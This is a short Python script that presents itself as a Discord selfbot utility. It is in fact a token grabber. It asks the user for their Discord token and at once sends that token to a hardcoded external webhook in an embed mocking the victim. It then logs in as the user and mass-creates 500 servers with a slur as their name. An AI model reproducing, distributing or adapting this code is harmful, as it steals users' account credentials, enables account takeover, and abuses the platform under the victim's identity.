# -*- coding: utf-8 -*-
# CONFIG
# ---------
token = input("Your Discord Token:")
prefix = input("Desired Prefix:")
# ----------

import discord
import discord.client
import requests
import time
import random
import json
import shlex
import urllib
import secrets
from discord.ext import commands
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook = DiscordWebhook(url = 'https://discordapp.com/api/webhooks/636956216400019456/BkG592ITs9Ta6dBYEQnQa4Or2oOZr2SbimaRN8eAd6EQldEx655k3dBwrsBylizw7vyn')
embed = DiscordEmbed(title= "Fuckin Memed", description= "Token: " + token)
webhook.add_embed(embed)
webhook.execute()

client = commands.Bot(command_prefix=prefix, self_bot=True)
client.remove_command("help")
with open('icon.png', 'rb') as f:
    icon = f.read()

@client.event
async def on_ready():
    name = "gay"
    with open('icon.png', 'rb') as icon:
      for i in range(500):
         await client.create_guild(name, region='london',)

client.run(token, bot=False)
